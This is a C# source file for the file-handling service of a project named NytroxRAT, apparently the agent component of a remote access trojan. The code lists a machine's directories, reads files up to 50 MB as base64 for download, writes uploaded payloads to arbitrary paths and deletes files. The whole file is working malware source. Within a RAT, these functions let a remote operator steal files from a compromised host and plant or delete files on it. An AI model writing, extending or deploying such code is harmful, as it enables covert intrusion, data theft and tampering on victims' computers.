using System.IO;
using NytroxRAT.Shared.Models;

namespace NytroxRAT.Agent.Services;

public class FileService
{
    public FileListResponse ListDirectory(string path)
    {
        try
        {
            var info    = new DirectoryInfo(path);
            var entries = new List<FileEntry>();

            foreach (var dir in info.GetDirectories())
            {
                try { entries.Add(new FileEntry { Name = dir.Name, FullPath = dir.FullName, IsDirectory = true, LastModified = dir.LastWriteTime }); }
                catch { /* skip inaccessible */ }
            }

            foreach (var file in info.GetFiles())
            {
                try { entries.Add(new FileEntry { Name = file.Name, FullPath = file.FullName, IsDirectory = false, Size = file.Length, LastModified = file.LastWriteTime }); }
                catch { /* skip inaccessible */ }
            }

            return new FileListResponse { Path = path, Entries = entries };
        }
        catch (Exception ex)
        {
            return new FileListResponse { Path = path, Error = ex.Message };
        }
    }

    public FileDownloadResponse DownloadFile(string path)
    {
        try
        {
            // Limit to 50 MB for safety
            var info = new FileInfo(path);
            if (info.Length > 50 * 1024 * 1024)
                return new FileDownloadResponse { Path = path, Error = "File too large (>50 MB)" };

            var bytes = File.ReadAllBytes(path);
            return new FileDownloadResponse { Path = path, DataBase64 = Convert.ToBase64String(bytes) };
        }
        catch (Exception ex)
        {
            return new FileDownloadResponse { Path = path, Error = ex.Message };
        }
    }

    public FileUploadResponse UploadFile(FileUploadRequest req)
    {
        try
        {
            var bytes = Convert.FromBase64String(req.DataBase64);
            var dir   = Path.GetDirectoryName(req.DestinationPath);
            if (dir != null) Directory.CreateDirectory(dir);
            File.WriteAllBytes(req.DestinationPath, bytes);
            return new FileUploadResponse { Success = true };
        }
        catch (Exception ex)
        {
            return new FileUploadResponse { Success = false, Error = ex.Message };
        }
    }

    public FileDeleteResponse DeletePath(string path)
    {
        try
        {
            if (Directory.Exists(path))
                Directory.Delete(path, recursive: false);
            else
                File.Delete(path);
            return new FileDeleteResponse { Success = true };
        }
        catch (Exception ex)
        {
            return new FileDeleteResponse { Success = false, Error = ex.Message };
        }
    }
}
